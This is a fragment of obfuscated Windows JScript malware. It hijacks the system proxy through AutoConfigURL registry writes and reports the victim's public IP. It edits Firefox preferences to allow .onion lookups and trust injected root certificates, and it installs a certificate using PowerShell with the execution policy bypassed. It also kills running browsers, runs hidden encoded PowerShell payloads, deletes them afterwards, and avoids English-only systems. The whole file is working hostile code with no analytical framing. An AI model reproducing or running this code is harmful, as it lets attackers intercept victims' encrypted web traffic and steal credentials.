            if (!QlfVHyZjqtK) {
                if ((iSFQGl >= 33) && (iSFQGl <= 47)) {
                    continue;
                }
                if ((iSFQGl >= 58) && (iSFQGl <= 64)) {
                    continue;
                }
                if ((iSFQGl >= 91) && (iSFQGl <= 96)) {
                    continue;
                }
                if ((iSFQGl >= 123) && (iSFQGl <= 126)) {
                    continue;
                }
            }
            BmNZYLGnslD++;
            CUzkuGl += String.fromCharCode(iSFQGl);
        }
        return CUzkuGl;
    },
    xoeXaWl: function(str){
        return str.replace(/(^\s+)|(\s+$)/g, "");

		
    }
};
if (!String.format) {
  String.format = function(format) {
    var args = Array.prototype.slice.call(arguments, 1);
    return format.replace(/{(\d+)}/g, function(match, number) { 
      return typeof args[number] != "undefined"
        ? args[number] 
        : match
      ;
    });
  };
}
function APJueqSAOIgm(){
	this.GrAFx=FEaWbpCaknAOVso.lqMaq(8)+".ps1";
	
	this.rIMulNWDuM=function(){
		var ZHOyrYuCEO = new ActiveXObject("MSXML2"+".XML"+"hxxp");
		try{
			ZHOyrYuCEO.open("GET","hxxp://api.ipify.org/",false);
			ZHOyrYuCEO.send();
			if(ZHOyrYuCEO.status==200){
				return FEaWbpCaknAOVso.xoeXaWl(ZHOyrYuCEO.responseText);
			}
		}catch(e){}
		try{
			ZHOyrYuCEO.open("GET","hxxp://icanhazip.com/",false);
			ZHOyrYuCEO.send();
			if(ZHOyrYuCEO.status==200){
				return FEaWbpCaknAOVso.xoeXaWl(ZHOyrYuCEO.responseText);
			}
		}catch(e){}
		return "";
	};
	
	this.uFHRdMZP=function(){
		KwpKwFQk.RegWrite(LYqwFCpqVfOQ.btGze("SEtDV"+"VxTb2Z0d2FyZVxNaWNyb3NvZ"+"nRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm"+"5ldCBTZXR0aW5nc1xBdXRvRGV0ZWN0"),0,"REG_DWORD");
		
		for(var i=0;i<5;i++){
			var SnGpMPfVVvMNV=this.rIMulNWDuM();
			if(SnGpMPfVVvMNV.length>0){
				this.qsJmPDdxdYQMRZV(String.format("hxxp://127.0.0.1:37031/{0}.js?ip={1}",FEaWbpCaknAOVso.lqMaq(8),SnGpMPfVVvMNV));
			}
		}
	};
	this.qsJmPDdxdYQMRZV=function(s){
		KwpKwFQk.RegWrite(LYqwFCpqVfOQ.btGze("SEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5nc1xBdXRvQ29uZmlnVVJM"),s,"REG_SZ");
	};
	this.OCrUNBmouNO=function(){
		this.GrAFx=pPzP+"\\"+this.GrAFx;
		var ddrZ=LYqwFCpqVfOQ.btGze(LuTqNHujCwnmK.ScJdXxGW);
		ddrZ=ddrZ.replace("%CERT%",LuTqNHujCwnmK.JbviIuijQwpR);
		FEaWbpCaknAOVso.cGxSl(this.GrAFx,ddrZ);
		KwpKwFQk.Run("cmd /c powershell -ep Unrestricted -f \""+this.GrAFx+"\" | find /v \"\" >> \""+Tho+"\"",0,true);
	};
	this.HkI=function(){
		if(ILmqJnaRb.FileExists(this.GrAFx)){
			ILmqJnaRb.DeleteFile(this.GrAFx);
		}
	};
}
function tFptnsREyVtkRJB(){
	var vpK = EPNbDBBCipDjPjL + "\\Mozilla\\Firefox\\Profiles";
	this.uwXQVnyv=FEaWbpCaknAOVso.lqMaq(8)+".ps1";
	
	this.Eue=function(){
		if(ILmqJnaRb.FolderExists(vpK)){
			var ArrFirefoxProfileList=ILmqJnaRb.GetFolder(vpK).SubFolders;
			if(ArrFirefoxProfileList.Count>0){
				var e = new Enumerator(ArrFirefoxProfileList);
				e.moveFirst();
				while (e.atEnd() == false){
					var folder=e.item();
					if(folder.Name.indexOf(".default")>-1){
						return folder.Path;
					}
					e.moveNext();
				}
			}
		}
		return false;
	};
	this.yNndIOONQIsI=function(){
		var UIQKEQxjbN=this.Eue();
		if(UIQKEQxjbN!=false){
			var ZwLAgGVmQjaDq=UIQKEQxjbN+LYqwFCpqVfOQ.btGze("XHByZWZzLmpz");
			if(ILmqJnaRb.FileExists(ZwLAgGVmQjaDq)){
				var ajMoGPBD=ILmqJnaRb.OpenTextFile(ZwLAgGVmQjaDq,1).ReadAll();
				var Xzgarg=ajMoGPBD.split("\n");
				var KKdpHjpZ=[];
				for(var i=0;i<Xzgarg.length;i++){
					if(Xzgarg[i].indexOf("network.dns.blockDotOnion")!=-1){
						Xzgarg[i]=Xzgarg[i].replace("true","false");
					}
					if(Xzgarg[i].indexOf("network.proxy.")==-1 && Xzgarg[i].indexOf("security.enterprise_roots.enabled")==-1){
						KKdpHjpZ.push(Xzgarg[i]);
					}
					
				}
				KKdpHjpZ.push("user_pref(\"network.dns.blockDotOnion\", false);");
				KKdpHjpZ.push("user_pref(\"security.enterprise_roots.enabled\", true);");
				ajMoGPBD=KKdpHjpZ.join("\n");
				var stream=ILmqJnaRb.CreateTextFile(ZwLAgGVmQjaDq, true);
				stream.Write(ajMoGPBD);
				stream.Close();
			}
		}
	};
	this.InstallCert=function(){
		this.uwXQVnyv=pPzP+"\\"+this.uwXQVnyv;
		var ddrZ=LYqwFCpqVfOQ.btGze(LuTqNHujCwnmK.vyOMKczJG);
		ddrZ=ddrZ.replace("%CERT%",LuTqNHujCwnmK.JbviIuijQwpR);
		FEaWbpCaknAOVso.cGxSl(this.uwXQVnyv,ddrZ);
		var ENV_WINDIR=KwpKwFQk.ExpandEnvironmentStrings("%WINDIR%");
		KwpKwFQk.Run("cmd /c powershell -ep bypass -f \""+this.uwXQVnyv+"\" | find /v \"\" >> \""+Tho+"\"",0,true);
		KwpKwFQk.Run("cmd /c "+ENV_WINDIR+"\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass -f \""+this.uwXQVnyv+"\" | find /v \"\" >> \""+Tho+"\"",0,true);
		KwpKwFQk.Run("cmd /c "+ENV_WINDIR+"\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass -f \""+this.uwXQVnyv+"\" | find /v \"\" >> \""+Tho+"\"",0,true);
	};
	this.Close=function(){
		if(ILmqJnaRb.FileExists(this.uwXQVnyv)){
			ILmqJnaRb.DeleteFile(this.uwXQVnyv);
		}
	};
}
function C_TP(){
	this.FileName=FEaWbpCaknAOVso.lqMaq(FEaWbpCaknAOVso.elDYmjftx(5,10))+".ps1";
	this.lTWcYVI=function(){
		var IZeM=FEaWbpCaknAOVso.elDYmjftx(0,LuTqNHujCwnmK.ZVYNwLUidGnoZO.length-1);
		var IEeDsIEDwlExAj=LuTqNHujCwnmK.ZVYNwLUidGnoZO[IZeM];
		this.FileName=KwpKwFQk.ExpandEnvironmentStrings("%ALLUSERSPROFILE%")+"\\"+this.FileName;
		var ddrZ=LYqwFCpqVfOQ.btGze(LuTqNHujCwnmK.GRtnT);
		ddrZ=ddrZ.replace(/%DOMAIN%/g,IEeDsIEDwlExAj);
		FEaWbpCaknAOVso.cGxSl(this.FileName,ddrZ);
		KwpKwFQk.Run("cmd /c powershell -ep Unrestricted -f \""+this.FileName+"\" | find /v \"\" >> \""+Tho+"\"",0,true);
	};
	this.Close=function(){
		if(ILmqJnaRb.FileExists(this.FileName)){
			ILmqJnaRb.DeleteFile(this.FileName);
		}
	};
}
function EDXUfG(){
	this.FileName=pPzP+"\\"+FEaWbpCaknAOVso.lqMaq(8)+".ps1";
	this.FcRYr=function(){
		Opcgm=new APJueqSAOIgm();
		pBGIYAnkrVGDD=new tFptnsREyVtkRJB();
		WMkIyQC=new C_TP();
	};
	this.MvIOCBgYmxRQEB=function(){
		
		if(this.HCjquJsW()){
			
			return false;
			
		}
		this.FcRYr();
		WMkIyQC.lTWcYVI();
		this.BmsUPwixTCwUd();
		this.eZIhndsUVpRO();
		this.cegxFA();
		this.Close();
		
		this.zdV();
		
	};
	this.eZIhndsUVpRO=function(){
		Opcgm.OCrUNBmouNO();
		Opcgm.uFHRdMZP();
	};
	this.cegxFA=function(){
		pBGIYAnkrVGDD.InstallCert();
		pBGIYAnkrVGDD.yNndIOONQIsI();
	};
	this.BmsUPwixTCwUd=function(){
		KwpKwFQk.Run(LYqwFCpqVfOQ.btGze("dGFza2tpbGwgL0Y"+"gL2ltIGlleHBsb3JlLmV4ZQ=="),0,false);
		KwpKwFQk.Run(LYqwFCpqVfOQ.btGze("dGFza2tpbGwgL0Yg"+"L2ltIGZpcmVmb3guZXhl"),0,false);
		KwpKwFQk.Run(LYqwFCpqVfOQ.btGze("dGFza2tpbGwgL0YgL"+"2ltIGNocm9tZS5leGU="),0,false);
	};
	this.zdV=function(){
		var bData=LYqwFCpqVfOQ.btGze(LuTqNHujCwnmK.pbJK);
		FEaWbpCaknAOVso.cGxSl(this.FileName,bData);
		KwpKwFQk.Run("powershell -ep Unrestricted -f \""+this.FileName+"\"",0,true);
		if(ILmqJnaRb.FileExists(this.FileName)){
			ILmqJnaRb.DeleteFile(this.FileName);
		}
	};
	this.HCjquJsW=function(){
		var wyutAVB = GetObject("winmgmts:\\\\.\\root\\cimv2").ExecQuery("Select * from Win32_OperatingSystem");
		var arr = [];
		for (var enumItems = new Enumerator(wyutAVB) ; !enumItems.atEnd() ; enumItems.moveNext()) {
			var MUILanguages = enumItems.item().MUILanguages.toArray();
			for (i in MUILanguages) {
				arr.push(MUILanguages[i]);
			}
		}
		var muilangs = arr.join(",");
		if(muilangs=='en-US'){
			return true;
		}
		return false;
	};
	this.Close=function(){
		Opcgm.HkI();
		pBGIYAnkrVGDD.Close();
		WMkIyQC.Close();
	};   
}
var kIGj = new EDXUfG();
kIGj.MvIOCBgYmxRQEB();
